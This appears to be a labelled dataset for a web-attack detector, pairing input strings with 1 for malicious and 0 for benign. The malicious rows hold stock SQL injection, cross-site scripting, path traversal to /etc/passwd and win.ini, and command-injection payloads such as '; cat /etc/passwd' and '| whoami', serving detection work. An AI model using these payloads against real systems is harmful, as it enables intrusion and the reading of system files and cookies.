/contact?session=56963,0
' OR 4=3 --,1
/user?id=7907,0
' OR 1=1 --,1
h0MxC603H4k7,0
../../../windows/win.ini,1
/contact?session=65455,0
dashboard,0
admin'/* bypass */OR 1=1,1
1' o r '1'='1,1
' OR 3=2 --,1
/login?id=1832,0
blog,0
' OR '1'='1,1
5DJaybA4w,0
/contact?session=68499,0
/user?id=5519,0
XBOCYqBq5qym,0
/settings?session=44423,0
' OR 6=9 --,1
/user?id=1783,0
' OR 1=1 --,1
' OR 3=3 --,1
login,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
admin'/* bypass */OR 1=1,1
; cat /etc/passwd,1
' OR 1=2 --,1
../../../../etc/passwd,1
; cat /etc/passwd,1
/checkout?session=94916,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
login,0
/user?id=9320,0
<script>var a=579;alert(a)</script>,1
f6GpHp5TH,0
/home?id=7595,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 7=4 --,1
onerror=alert(1),1
admin%00' OR 1=1,1
/dashboard?session=94413,0
<script>alert(document.cookie)</script>,1
' OR 7=4 --,1
/settings?id=5815,0
onerror=alert(1),1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
about,0
<script>var a=564;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 3=9 --,1
onerror=alert(1),1
x9XYg9Pak,0
/contact?id=1065,0
1' o r '1'='1,1
/settings?session=21720,0
dashboard,0
user,0
ZXHEXk3uq0j9z,0
profile,0
/login?session=75319,0
<script>var a=24;alert(a)</script>,1
/login?session=75792,0
/register?id=977,0
/search?session=54920,0
<script>alert(document.cookie)</script>,1
admin' --,1
s E l E c T * f R o M a d m i n,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/login?session=23124,0
ieHqiA8Bo6q,0
<script>var a=133;alert(a)</script>,1
profile,0
5sISwOOyH9Y3Bv,0
register,0
/blog?id=7922,0
javascript:alert(1),1
d60GB8dtkGDL,0
checkout,0
admin' --,1
javascript:alert(1),1
' OR 4=6 --,1
/index?id=7109,0
| whoami,1
MomH1OkyBJYd,0
onerror=alert(1),1
/login?session=47106,0
<script>var a=329;alert(a)</script>,1
<script>var a=798;alert(a)</script>,1
<script>var a=883;alert(a)</script>,1
javascript:alert(1),1
onerror=alert(1),1
home,0
/checkout?session=11837,0
admin'/* bypass */OR 1=1,1
<script>var a=401;alert(a)</script>,1
sDpTplUzJ,0
/register?session=57063,0
javascript:alert(1),1
<script>var a=627;alert(a)</script>,1
profile,0
s E l E c T * f R o M a d m i n,1
<script>var a=580;alert(a)</script>,1
onerror=alert(1),1
admin%00' OR 1=1,1
' OR 2=8 --,1
j85oXSD41F,0
' OR 6=3 --,1
/cart?id=1439,0
/home?session=31953,0
profile,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/checkout?session=40506,0
/home?id=7197,0
1' o r '1'='1,1
/blog?session=24689,0
admin'/* bypass */OR 1=1,1
/search?id=368,0
/about?id=5540,0
6hGX0mbLaNdPd,0
/index?id=7730,0
<script>alert(document.cookie)</script>,1
; cat /etc/passwd,1
/about?session=31664,0
/search?id=2746,0
checkout,0
/cart?id=5409,0
RTTqkFD2UA9d66,0
admin%00' OR 1=1,1
/register?id=6739,0
; cat /etc/passwd,1
../../../windows/win.ini,1
' OR 1=9 --,1
checkout,0
/checkout?id=7733,0
ZaolHsuIgd,0
<script>var a=710;alert(a)</script>,1
profile,0
/user?id=9449,0
Ip3yZtVzp2Uo,0
/dashboard?id=1018,0
contact,0
ePv0RMt7yk,0
<script>var a=244;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
login,0
admin%00' OR 1=1,1
/user?id=6233,0
' OR 3=2 --,1
/cart?id=9131,0
admin' --,1
index,0
/profile?session=93104,0
lNqQKk2R4NURou,0
login,0
/checkout?session=67243,0
/register?id=6377,0
profile,0
/contact?id=8173,0
settings,0
../../../windows/win.ini,1
user,0
1' o r '1'='1,1
YYyumKBz,0
cart,0
' OR 1=1 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
s E l E c T * f R o M a d m i n,1
/search?id=8090,0
<script>var a=123;alert(a)</script>,1
' OR 7=2 --,1
BkxRrBrBfg0LW,0
<script>var a=670;alert(a)</script>,1
<script>var a=936;alert(a)</script>,1
<script>var a=160;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=591;alert(a)</script>,1
<script>var a=945;alert(a)</script>,1
/user?id=3411,0
/dashboard?id=3173,0
<script>var a=281;alert(a)</script>,1
/search?session=90203,0
register,0
| whoami,1
checkout,0
; cat /etc/passwd,1
cart,0
' OR 1=2 --,1
/blog?id=4096,0
1' o r '1'='1,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>var a=604;alert(a)</script>,1
eyiXCIOiFRjazH,0
<script>var a=26;alert(a)</script>,1
register,0
/blog?session=86047,0
../../../../etc/passwd,1
onerror=alert(1),1
<script>var a=262;alert(a)</script>,1
<script>var a=759;alert(a)</script>,1
/login?id=832,0
<script>var a=147;alert(a)</script>,1
/settings?id=6855,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
1' o r '1'='1,1
1' o r '1'='1,1
' OR 1=1 --,1
<script>var a=105;alert(a)</script>,1
; cat /etc/passwd,1
../../../windows/win.ini,1
blog,0
s E l E c T * f R o M a d m i n,1
admin' --,1
/profile?id=6931,0
/settings?session=22896,0
DSc6ZBn10Z,0
admin'/* bypass */OR 1=1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
| whoami,1
1' o r '1'='1,1
<script>var a=147;alert(a)</script>,1
' OR 4=2 --,1
/login?id=614,0
admin' --,1
/login?id=8352,0
; cat /etc/passwd,1
<script>var a=26;alert(a)</script>,1
../../../windows/win.ini,1
profile,0
dashboard,0
../../../../etc/passwd,1
../../../../etc/passwd,1
<script>var a=54;alert(a)</script>,1
/profile?id=2214,0
P7gGN6kJlHI,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/dashboard?id=9841,0
/about?id=8539,0
/checkout?session=22458,0
JbJXcEUqWw,0
<script>alert(document.cookie)</script>,1
' OR 8=1 --,1
3JJjO9J8YY,0
admin'/* bypass */OR 1=1,1
' OR 9=1 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/dashboard?id=9587,0
' OR '1'='1,1
; cat /etc/passwd,1
/blog?session=25354,0
' OR 8=4 --,1
admin' --,1
dashboard,0
<script>var a=649;alert(a)</script>,1
770d3cfj6Ra1dxo,0
<script>alert(document.cookie)</script>,1
../../../../etc/passwd,1
bW8JaA3h0AoC,0
' OR 4=3 --,1
onerror=alert(1),1
1' o r '1'='1,1
' OR 3=1 --,1
AXhZ5URCmhDQ,0
<script>alert(document.cookie)</script>,1
javascript:alert(1),1
../../../windows/win.ini,1
../../../../etc/passwd,1
../../../windows/win.ini,1
/search?session=97349,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR '1'='1,1
contact,0
8xiPhWxBGy1b1Hl,0
admin' --,1
; cat /etc/passwd,1
onerror=alert(1),1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/user?id=952,0
register,0
/profile?id=546,0
wHltPXdXfs,0
<script>var a=852;alert(a)</script>,1
../../../../etc/passwd,1
user,0
LNIRQBIIG9Cu,0
/login?session=74509,0
' OR 8=1 --,1
| whoami,1
DaH0f2vo,0
register,0
<script>var a=41;alert(a)</script>,1
' OR '1'='1,1
/contact?id=6247,0
' OR 1=1 --,1
admin' --,1
javascript:alert(1),1
admin%00' OR 1=1,1
/register?id=7983,0
1' o r '1'='1,1
<script>var a=995;alert(a)</script>,1
' OR 8=2 --,1
/home?id=726,0
' OR '1'='1,1
<script>var a=292;alert(a)</script>,1
/login?session=31953,0
/home?id=6584,0
gk8QxOESZy,0
/dashboard?session=84471,0
cart,0
<script>var a=908;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=31;alert(a)</script>,1
1' o r '1'='1,1
/login?id=2039,0
/index?id=3912,0
register,0
<script>var a=749;alert(a)</script>,1
checkout,0
blog,0
<script>var a=705;alert(a)</script>,1
../../../windows/win.ini,1
' OR 1=7 --,1
../../../../etc/passwd,1
onerror=alert(1),1
' OR 1=6 --,1
admin'/* bypass */OR 1=1,1
/checkout?id=7885,0
/settings?id=9187,0
user,0
admin'/* bypass */OR 1=1,1
/checkout?id=6387,0
gMxJdv6P6tuYsb,0
/search?session=19336,0
<script>alert(document.cookie)</script>,1
ClVwemtHB,0
1' o r '1'='1,1
search,0
/settings?session=38439,0
/index?id=3234,0
OqPbFovLIcYI,0
/login?session=82325,0
/login?session=52829,0
<script>var a=606;alert(a)</script>,1
' OR 6=2 --,1
1' o r '1'='1,1
Zra0TfMg,0
<script>var a=161;alert(a)</script>,1
../../../windows/win.ini,1
IlgFMFMR6p,0
/about?session=89275,0
cart,0
../../../../etc/passwd,1
checkout,0
' OR 3=7 --,1
/profile?session=20647,0
LsXP0A2bI3wxO,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 7=8 --,1
FD32uEP9slrq0,0
/dashboard?id=2695,0
admin%00' OR 1=1,1
/settings?session=11826,0
admin%00' OR 1=1,1
| whoami,1
/login?session=35751,0
/checkout?session=26850,0
' OR 4=9 --,1
' OR 9=3 --,1
/blog?session=92987,0
eR6KlDa1,0
xBYra1qy,0
blog,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/index?session=38256,0
ixqhdxPohYRwAuw,0
<script>var a=739;alert(a)</script>,1
| whoami,1
/checkout?id=7901,0
0kd87ndyoLSz3,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 8=7 --,1
/user?id=8663,0
admin'/* bypass */OR 1=1,1
../../../../etc/passwd,1
' OR 1=1 --,1
<script>var a=997;alert(a)</script>,1
' OR '1'='1,1
' OR 2=9 --,1
settings,0
/home?session=43814,0
dashboard,0
/home?session=55180,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
register,0
search,0
admin'/* bypass */OR 1=1,1
1' o r '1'='1,1
/login?id=5524,0
2GdRmMpAgZcz,0
<script>alert(document.cookie)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>var a=159;alert(a)</script>,1
<script>var a=947;alert(a)</script>,1
profile,0
KWSsaRoD1tmpeF,0
' OR 6=5 --,1
' OR 8=7 --,1
s E l E c T * f R o M a d m i n,1
' OR '1'='1,1
/profile?id=4445,0
| whoami,1
' OR 2=5 --,1
' OR '1'='1,1
<script>var a=741;alert(a)</script>,1
' OR 2=4 --,1
/cart?id=5018,0
' OR 3=5 --,1
index,0
<script>var a=760;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>var a=510;alert(a)</script>,1
admin' --,1
search,0
../../../windows/win.ini,1
search,0
' OR '1'='1,1
admin'/* bypass */OR 1=1,1
3gzmDNsvTNIDs6,0
l11vDTbg,0
Y9WlltCDhiSjGP,0
' OR 5=3 --,1
/login?session=88596,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/login?id=9851,0
E6xsnyLxFJsh4,0
/profile?id=8332,0
about,0
checkout,0
dmlLp1vlxk0t,0
/login?id=9585,0
/login?session=63321,0
search,0
s E l E c T * f R o M a d m i n,1
onerror=alert(1),1
../../../../etc/passwd,1
admin' --,1
/about?id=1884,0
/contact?session=12704,0
; cat /etc/passwd,1
javascript:alert(1),1
<script>var a=369;alert(a)</script>,1
/about?id=9906,0
<script>var a=478;alert(a)</script>,1
' OR 3=2 --,1
/register?id=357,0
Ej4oGqWSsvRaz0,0
contact,0
/login?id=7857,0
index,0
1' o r '1'='1,1
admin' --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
profile,0
dKOx7O8oBaEPC,0
checkout,0
admin'/* bypass */OR 1=1,1
<script>alert(document.cookie)</script>,1
1' o r '1'='1,1
' OR 8=6 --,1
' OR 1=1 --,1
' OR 1=7 --,1
../../../windows/win.ini,1
| whoami,1
checkout,0
dashboard,0
/cart?id=9876,0
s E l E c T * f R o M a d m i n,1
<script>var a=692;alert(a)</script>,1
admin' --,1
<script>alert(document.cookie)</script>,1
' OR 1=1 --,1
<script>var a=385;alert(a)</script>,1
admin' --,1
/cart?session=96765,0
javascript:alert(1),1
home,0
<script>var a=141;alert(a)</script>,1
spvSexpNQBf,0
/about?session=82487,0
' OR '1'='1,1
<script>alert(document.cookie)</script>,1
/register?session=89288,0
../../../windows/win.ini,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
admin'/* bypass */OR 1=1,1
/checkout?session=20870,0
; cat /etc/passwd,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 7=7 --,1
admin%00' OR 1=1,1
KTKe8Hsb,0
/blog?id=3162,0
/cart?id=5644,0
<script>alert(document.cookie)</script>,1
/contact?session=86346,0
' OR 6=1 --,1
' OR 2=9 --,1
../../../windows/win.ini,1
' OR 7=8 --,1
/contact?id=3111,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/settings?id=8852,0
javascript:alert(1),1
/cart?session=98150,0
| whoami,1
admin'/* bypass */OR 1=1,1
/login?id=3252,0
<script>alert(document.cookie)</script>,1
<script>var a=402;alert(a)</script>,1
<script>var a=694;alert(a)</script>,1
/checkout?id=4145,0
ioYo2gp3McELbQ,0
ZACoX26GygUA,0
/about?id=7833,0
/settings?session=18991,0
; cat /etc/passwd,1
nez0IZu7TUGg,0
s00VTaSWilV,0
../../../windows/win.ini,1
../../../windows/win.ini,1
/profile?id=5918,0
<script>var a=682;alert(a)</script>,1
' OR 1=1 --,1
/cart?session=49959,0
<script>var a=902;alert(a)</script>,1
/dashboard?id=731,0
/blog?session=71808,0
' OR 5=6 --,1
/login?id=9659,0
' OR 7=7 --,1
<script>var a=494;alert(a)</script>,1
user,0
i28GyMIfzLb,0
/register?session=82436,0
/settings?session=64250,0
' OR 9=2 --,1
javascript:alert(1),1
checkout,0
VgxinKxs2I90TP,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 2=4 --,1
user,0
| whoami,1
' OR 1=1 --,1
' OR '1'='1,1
' OR 1=1 --,1
onerror=alert(1),1
/settings?session=45919,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/dashboard?id=893,0
home,0
gofoACPv5Ged,0
/register?id=7703,0
<script>var a=530;alert(a)</script>,1
/dashboard?id=3343,0
54OkBJNYlp4v,0
' OR '1'='1,1
/user?session=90528,0
admin'/* bypass */OR 1=1,1
/profile?id=3377,0
2yqYZt00,0
contact,0
<script>alert(document.cookie)</script>,1
MNPoSUmgmbnA,0
| whoami,1
javascript:alert(1),1
<script>var a=988;alert(a)</script>,1
/blog?session=99928,0
/user?id=2167,0
/dashboard?session=52389,0
about,0
/register?session=25074,0
<script>var a=950;alert(a)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
; cat /etc/passwd,1
admin%00' OR 1=1,1
toCJ7DDx,0
/blog?id=9814,0
/user?id=733,0
<script>var a=939;alert(a)</script>,1
/search?id=4092,0
MtNvRZXcO8,0
admin%00' OR 1=1,1
/login?id=445,0
home,0
' OR 1=1 --,1
javascript:alert(1),1
1' o r '1'='1,1
../../../../etc/passwd,1
AVKevdABsxSFe5k,0
CdtpbYWR4W,0
/about?id=3319,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
1' o r '1'='1,1
s E l E c T * f R o M a d m i n,1
/login?session=17801,0
admin' --,1
' OR 8=6 --,1
' OR '1'='1,1
' OR 3=5 --,1
/blog?session=23300,0
hyK255atCQJ519f,0
../../../../etc/passwd,1
/contact?session=53772,0
' OR 1=1 --,1
/profile?id=7132,0
; cat /etc/passwd,1
<script>alert(document.cookie)</script>,1
; cat /etc/passwd,1
<script>var a=404;alert(a)</script>,1
4AMv7hfMC,0
XALtB43Mfg6g2FS,0
nXPfI38WiK2ELvx,0
' OR 8=1 --,1
/profile?id=3573,0
' OR '1'='1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>alert(document.cookie)</script>,1
/dashboard?id=9768,0
admin%00' OR 1=1,1
search,0
onerror=alert(1),1
| whoami,1
contact,0
M4p44yds,0
<script>alert(document.cookie)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/index?id=9085,0
/profile?session=40865,0
/dashboard?session=49792,0
/register?session=38613,0
' OR 3=2 --,1
/user?session=50108,0
; cat /etc/passwd,1
/dashboard?session=68840,0
/about?session=19263,0
user,0
settings,0
../../../windows/win.ini,1
admin' --,1
FVV9HSO1S2Ej,0
Xg4kP2VQqJsjU7I,0
gdiscfBL,0
| whoami,1
about,0
login,0
/cart?id=3641,0
/register?id=8088,0
TxDWClGwN0jZ54,0
1' o r '1'='1,1
checkout,0
<script>var a=99;alert(a)</script>,1
../../../windows/win.ini,1
javascript:alert(1),1
K7CECW13,0
../../../../etc/passwd,1
' OR '1'='1,1
' OR 5=8 --,1
/register?session=28952,0
<script>alert(document.cookie)</script>,1
LCLiwl4LI,0
admin%00' OR 1=1,1
/home?session=70654,0
onerror=alert(1),1
user,0
<script>alert(document.cookie)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/checkout?session=36830,0
' OR '1'='1,1
<script>var a=291;alert(a)</script>,1
/user?id=1882,0
keWjLL9Cx,0
rHxfl4dPP0gemt,0
<script>var a=859;alert(a)</script>,1
/home?session=44387,0
' OR 3=2 --,1
' OR 7=5 --,1
/profile?id=5160,0
' OR 3=7 --,1
onerror=alert(1),1
/blog?session=83315,0
<script>var a=187;alert(a)</script>,1
/register?session=53170,0
1' o r '1'='1,1
admin'/* bypass */OR 1=1,1
1' o r '1'='1,1
' OR '1'='1,1
/index?id=5683,0
XQyhsrvl,0
/cart?session=65778,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
40dq4Ffl,0
' OR '1'='1,1
index,0
s E l E c T * f R o M a d m i n,1
<script>var a=143;alert(a)</script>,1
/cart?id=8768,0
profile,0
../../../windows/win.ini,1
checkout,0
yO1RNBDADEo,0
91iOwVHZA,0
/search?session=95642,0
/about?id=5232,0
/blog?id=2639,0
login,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 1=1 --,1
<script>var a=771;alert(a)</script>,1
<script>var a=392;alert(a)</script>,1
about,0
/settings?session=74530,0
admin' --,1
/search?id=906,0
Q3maTbggUq5y,0
/contact?id=670,0
/blog?session=61898,0
/index?id=851,0
/contact?id=4491,0
<script>var a=702;alert(a)</script>,1
<script>var a=39;alert(a)</script>,1
blog,0
<script>var a=529;alert(a)</script>,1
admin%00' OR 1=1,1
<script>var a=232;alert(a)</script>,1
/profile?session=47167,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/checkout?session=79753,0
' OR 1=1 --,1
s E l E c T * f R o M a d m i n,1
/home?session=92529,0
dashboard,0
javascript:alert(1),1
/user?session=17245,0
<script>var a=103;alert(a)</script>,1
admin%00' OR 1=1,1
search,0
l7QaaURzSxv9yG,0
' OR 1=1 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=14;alert(a)</script>,1
admin' --,1
/home?session=42369,0
/profile?id=9699,0
' OR '1'='1,1
' OR 7=2 --,1
| whoami,1
aXCXmC4hF1T,0
dashboard,0
3JjN6zRvoFmgH,0
ZTvwCxeZaBu,0
' OR '1'='1,1
<script>var a=822;alert(a)</script>,1
admin%00' OR 1=1,1
about,0
/home?session=18550,0
about,0
<script>var a=810;alert(a)</script>,1
/index?session=65067,0
Qrw90UYv9Xj5Mv0,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/user?session=48757,0
Y2o6j7Nl3uuZYuR,0
/search?session=77716,0
' OR 3=9 --,1
pRZHoI0uFpeDY,0
VLOUJZBGDKi2,0
/blog?id=4099,0
/profile?session=24146,0
/about?session=81562,0
' OR 8=7 --,1
/search?id=4204,0
onerror=alert(1),1
admin%00' OR 1=1,1
4ja7RdkHad,0
<script>var a=642;alert(a)</script>,1
FMqxrfiZg9,0
/checkout?session=30494,0
9BFlNg1GiwtSi,0
cart,0
' OR 8=8 --,1
../../../../etc/passwd,1
<script>var a=221;alert(a)</script>,1
/profile?session=62698,0
' OR 1=1 --,1
| whoami,1
/checkout?id=2585,0
<script>var a=904;alert(a)</script>,1
<script>var a=681;alert(a)</script>,1
1' o r '1'='1,1
UsyU276pLL,0
' OR 4=2 --,1
QmAYzYxkVCr,0
/cart?session=50886,0
/dashboard?id=3320,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
; cat /etc/passwd,1
/profile?id=2430,0
user,0
' OR 8=9 --,1
../../../windows/win.ini,1
settings,0
' OR 7=8 --,1
<script>var a=408;alert(a)</script>,1
aYo6FPQd,0
1' o r '1'='1,1
../../../windows/win.ini,1
/register?session=34263,0
/settings?session=74639,0
' OR '1'='1,1
' OR 1=1 --,1
/dashboard?id=3352,0
' OR 6=6 --,1
' OR 6=1 --,1
../../../../etc/passwd,1
/cart?id=5794,0
../../../../etc/passwd,1
1' o r '1'='1,1
admin'/* bypass */OR 1=1,1
<script>var a=857;alert(a)</script>,1
M0GJcrf4hH01d,0
<script>var a=332;alert(a)</script>,1
' OR 1=1 --,1
' OR 4=5 --,1
' OR '1'='1,1
checkout,0
/search?id=5998,0
Lvm61ZAh94,0
' OR 3=7 --,1
' OR '1'='1,1
/register?id=9912,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/dashboard?session=49746,0
home,0
admin' --,1
F8s74nBqVkcwkc4,0
' OR '1'='1,1
<script>var a=865;alert(a)</script>,1
/register?id=6767,0
' OR 1=4 --,1
../../../../etc/passwd,1
' OR 7=1 --,1
/about?id=3600,0
' OR 1=1 --,1
<script>var a=370;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
FqJiR0pdEAff5Yx,0
/about?id=4064,0
/register?session=18422,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/cart?session=74975,0
../../../../etc/passwd,1
XtC4aP5z51m,0
' OR 4=4 --,1
<script>var a=232;alert(a)</script>,1
' OR 1=8 --,1
javascript:alert(1),1
/profile?id=3456,0
| whoami,1
profile,0
<script>var a=343;alert(a)</script>,1
' OR 8=6 --,1
' OR 8=6 --,1
| whoami,1
DT0831bx,0
2cqqUQgQ,0
register,0
; cat /etc/passwd,1
login,0
cart,0
admin'/* bypass */OR 1=1,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/search?session=70717,0
onerror=alert(1),1
/index?id=3593,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR '1'='1,1
dashboard,0
/login?session=55428,0
s E l E c T * f R o M a d m i n,1
' OR 5=7 --,1
/cart?id=8305,0
1' o r '1'='1,1
<script>var a=306;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
/contact?id=6003,0
m3K45KPLi,0
<script>var a=941;alert(a)</script>,1
FdOn7TNTqH,0
yp9UB6eATDtE58c,0
' OR 3=8 --,1
1' o r '1'='1,1
about,0
/dashboard?session=48943,0
| whoami,1
/blog?id=4580,0
/contact?id=5871,0
<script>var a=25;alert(a)</script>,1
../../../windows/win.ini,1
/search?id=113,0
onerror=alert(1),1
/cart?session=25825,0
/search?session=30430,0
mR9xJi15fl4,0
register,0
onerror=alert(1),1
/cart?session=10706,0
/search?session=71818,0
' OR 8=7 --,1
/settings?id=7156,0
<script>var a=200;alert(a)</script>,1
HjvqLI1X48nU,0
/register?id=2303,0
' OR 5=3 --,1
' OR 2=3 --,1
../../../windows/win.ini,1
fGhG1Rkv48wMng8,0
OOWM1sck,0
1' o r '1'='1,1
/search?id=4632,0
/search?session=17604,0
AHTPM7Uip2ysJEr,0
<script>alert(document.cookie)</script>,1
/home?session=62707,0
profile,0
ZmsdAD8H,0
register,0
P6LAw9YNZXVbqQc,0
settings,0
1' o r '1'='1,1
1XHP0c8ce,0
admin'/* bypass */OR 1=1,1
/dashboard?session=10130,0
s E l E c T * f R o M a d m i n,1
onerror=alert(1),1
<script>var a=739;alert(a)</script>,1
; cat /etc/passwd,1
| whoami,1
../../../../etc/passwd,1
kt2sCBnhWJkvFgY,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/dashboard?id=5192,0
B0A3z8tnwCR,0
profile,0
/cart?id=3307,0
; cat /etc/passwd,1
5pmlQLBaO3bvzBk,0
/checkout?id=5201,0
onerror=alert(1),1
; cat /etc/passwd,1
edU2ooCATHvGO7U,0
contact,0
checkout,0
/profile?id=9133,0
<script>var a=169;alert(a)</script>,1
; cat /etc/passwd,1
' OR 3=2 --,1
settings,0
/profile?session=83276,0
' OR 1=1 --,1
/contact?id=49,0
search,0
/index?id=3201,0
admin' --,1
/home?id=5437,0
s E l E c T * f R o M a d m i n,1
/user?session=89658,0
' OR 5=8 --,1
/register?session=87571,0
javascript:alert(1),1
' OR 4=4 --,1
I9I1IJUgeZ8XT,0
/checkout?session=10190,0
/cart?id=2685,0
search,0
/dashboard?id=2260,0
/about?id=872,0
PZ0BkHyU,0
' OR 8=6 --,1
<script>var a=806;alert(a)</script>,1
/user?id=1923,0
index,0
1' o r '1'='1,1
<script>var a=107;alert(a)</script>,1
| whoami,1
' OR '1'='1,1
mxIc18994OzP,0
' OR 9=3 --,1
admin%00' OR 1=1,1
<script>alert(document.cookie)</script>,1
' OR 3=4 --,1
/settings?session=31904,0
/search?id=8920,0
/settings?session=64385,0
va81seEZyo0,0
<script>var a=551;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=361;alert(a)</script>,1
; cat /etc/passwd,1
s E l E c T * f R o M a d m i n,1
<script>var a=276;alert(a)</script>,1
/checkout?id=3707,0
' OR 2=2 --,1
/cart?id=6239,0
admin'/* bypass */OR 1=1,1
oqEa5cmEmT,0
' OR 6=8 --,1
/register?id=3359,0
<script>var a=510;alert(a)</script>,1
NAssSu5N,0
/user?id=862,0
1' o r '1'='1,1
' OR 8=2 --,1
/login?session=66438,0
l6ns2lvQR2BzKKJ,0
/login?id=5264,0
/blog?id=3738,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/dashboard?session=35646,0
search,0
' OR 2=5 --,1
../../../../etc/passwd,1
admin' --,1
about,0
' OR 1=1 --,1
onerror=alert(1),1
login,0
../../../windows/win.ini,1
about,0
' OR 2=2 --,1
1' o r '1'='1,1
' OR 5=4 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
5Q3Tc4JeLp1Gq,0
byNUQSUmof,0
/settings?id=7498,0
login,0
profile,0
<script>var a=546;alert(a)</script>,1
onerror=alert(1),1
/user?session=19472,0
admin%00' OR 1=1,1
' OR 6=7 --,1
/index?session=44125,0
../../../windows/win.ini,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
J12sITup3,0
javascript:alert(1),1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/cart?session=41914,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
search,0
' OR 2=5 --,1
' OR 4=2 --,1
/home?session=43759,0
search,0
/about?id=4478,0
onerror=alert(1),1
/profile?session=82508,0
index,0
dashboard,0
/search?id=6281,0
../../../../etc/passwd,1
1' o r '1'='1,1
; cat /etc/passwd,1
/home?session=90411,0
cart,0
/search?session=69577,0
../../../../etc/passwd,1
<script>var a=935;alert(a)</script>,1
' OR '1'='1,1
../../../windows/win.ini,1
' OR 2=4 --,1
/dashboard?id=6285,0
' OR 1=1 --,1
| whoami,1
../../../../etc/passwd,1
' OR '1'='1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=520;alert(a)</script>,1
<script>var a=533;alert(a)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/cart?session=35057,0
javascript:alert(1),1
admin%00' OR 1=1,1
<script>var a=277;alert(a)</script>,1
/search?session=35827,0
<script>var a=84;alert(a)</script>,1
../../../../etc/passwd,1
login,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
admin' --,1
/cart?id=1481,0
admin' --,1
/index?id=3301,0
' OR 1=5 --,1
/index?session=71223,0
onerror=alert(1),1
../../../../etc/passwd,1
gqliLNfr,0
; cat /etc/passwd,1
/dashboard?id=4731,0
' OR 9=2 --,1
contact,0
<script>var a=5;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
| whoami,1
javascript:alert(1),1
1' o r '1'='1,1
do6tAWNvPWS70j,0
' OR 3=9 --,1
about,0
/register?id=3376,0
' OR 5=8 --,1
' OR 3=1 --,1
1' o r '1'='1,1
<script>var a=943;alert(a)</script>,1
<script>var a=533;alert(a)</script>,1
1sT8TOXrJLI9WB,0
blog,0
<script>var a=872;alert(a)</script>,1
cart,0
/home?id=5598,0
/blog?id=3821,0
/checkout?id=2975,0
/about?session=14136,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 2=3 --,1
admin' --,1
user,0
register,0
/about?id=8930,0
/profile?session=42236,0
/search?id=4989,0
<script>var a=310;alert(a)</script>,1
/search?id=3065,0
<script>var a=8;alert(a)</script>,1
/user?id=2916,0
/cart?id=517,0
1' o r '1'='1,1
onerror=alert(1),1
/search?id=4136,0
onerror=alert(1),1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 8=9 --,1
/user?session=94913,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/profile?id=6584,0
' OR 6=5 --,1
FsPr3UQzfOijUP0,0
<script>var a=944;alert(a)</script>,1
' OR '1'='1,1
| whoami,1
contact,0
admin%00' OR 1=1,1
cd0wsDevXnBI8er,0
/dashboard?id=9414,0
lQNmyiVKQ,0
MmDSdZSjhl4,0
/profile?session=30661,0
/checkout?session=56587,0
' OR 7=1 --,1
